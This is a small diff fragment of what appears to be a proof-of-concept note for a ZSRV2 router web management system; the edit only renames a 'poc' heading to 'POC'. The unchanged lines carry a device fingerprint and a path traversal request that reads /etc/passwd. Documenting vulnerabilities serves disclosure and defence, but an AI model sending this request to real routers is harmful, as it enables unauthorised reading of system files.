@@ -8,7 +8,7 @@
 title="ZSRV2路由器Web管理系统"
 ```
 
-## poc
+## POC
 
 ```
 GET /css//../../../../../../../../etc/passwd HTTP/1.1
